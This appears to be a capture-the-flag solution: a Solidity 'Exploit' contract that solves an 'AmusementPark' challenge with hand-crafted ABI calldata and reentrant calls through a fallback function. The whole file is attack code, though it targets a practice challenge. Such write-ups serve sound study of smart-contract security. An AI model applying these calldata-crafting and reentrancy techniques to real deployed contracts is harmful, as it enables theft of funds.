//SPDX-License-Identifier: MIT
pragma solidity 0.8.11;

import './Setup.sol';

contract Exploit {
    AmusementPark challenge;
    constructor(AmusementPark _challenge) {
        challenge = _challenge;
    }
    
    function reverseBytes(bytes memory data) public pure returns (bytes memory)
    {
        bytes memory value;
        for(uint s = data.length; s > 0; s--) {
            value = bytes.concat(value, data[s-1]);
        }
        return value;
    }

    function play() public {
        bytes[] memory mirrors = new bytes[](4);
        mirrors[0] = abi.encodePacked(uint256(1));
        mirrors[1] = abi.encodePacked(uint256(3));
        mirrors[2] = abi.encodePacked(uint256(0));

        //bytes memory ticket = abi.encodeCall(challenge._HouseOfMirrors, (mirrors));
        bytes[] memory roller = new bytes[](2); // 0 2 0 1 4 3 1 5
        uint r;
        r ^= 5;
        r <<= 3;
        r ^= 1;
        r <<= 3;
        r ^= 3;
        r <<= 3;
        r ^= 4;
        r <<= 3;
        r ^= 1;
        r <<= 3;
        r ^= 0;
        r <<= 3;
        r ^= 2;
        r <<= 3;
        r ^= 0;
        roller[0] = abi.encodePacked(r);
        roller[1] = abi.encodeCall(challenge._HouseOfMirrors, (mirrors));
        bytes memory rollercoaster = abi.encodeCall(challenge._Rollercoaster, (roller));
        // what the actual f. I've no idea why.. this took me forever.
        // I wasn't able to do this with normal abi.encode*** calls, for some reason the decoding of the bytes type didn't work
        // needed to rebuild the bytes type: the first 2*32 bytes describe some offset + length
        // The offset is 0x0..020, but should be 0x0..040 instead
        // please tell me I'm missing something here -_-
        bytes memory yellowCar = bytes.concat(bytes23(uint184(1)), bytes32(uint(0x40)), bytes32(rollercoaster.length), rollercoaster);
        bytes memory prev = reverseBytes(abi.encodeCall(challenge._BumperCars, ("blue", uint40(bytes5(bytes.concat("255", "0", "0"))), yellowCar)));
        bytes memory ticket = abi.encodeCall(challenge._Carousel, (prev));
        challenge.parkEntrance(ticket);
    }

    uint8 count;
    bool done;
    bool done2;
    fallback() external {
        // I have no idea what's goign on, I'm sorry.
        // This took forever, maybe I'll clean this up... later.
        // (you can probably delete half of this code, but I'm really done with this :X)
        bytes[] memory mirrors = new bytes[](4);
        ++count;
        if (count > 8)
        {
            revert();
        }
        mirrors[0] = abi.encodePacked(uint256(1));
        mirrors[1] = abi.encodePacked(uint256(3));
        mirrors[2] = abi.encodePacked(uint256(0));
        if (count == 6)
        {
            mirrors[0] = abi.encodePacked(uint256(0));
            mirrors[2] = abi.encodePacked(uint256(1));
        }
        if (count == 7)
        {
            if (done2)
            {
                revert();
            }
            done2 = true;
            mirrors[0] = abi.encodePacked(uint256(2));
            mirrors[1] = abi.encodePacked(uint256(3));
            mirrors[2] = abi.encodePacked(uint256(8));
            mirrors[3] = abi.encodeCall(challenge._leavePark, ());
            bytes memory ticket = abi.encodeCall(challenge._HouseOfMirrors, (mirrors));
            challenge.parkEntrance(ticket);
            return;
        }
        if (count == 8)
        {
            revert();
        }
        bytes memory ticket = abi.encodeCall(challenge._HouseOfMirrors, (mirrors));
        challenge.parkEntrance(ticket);
    }
}
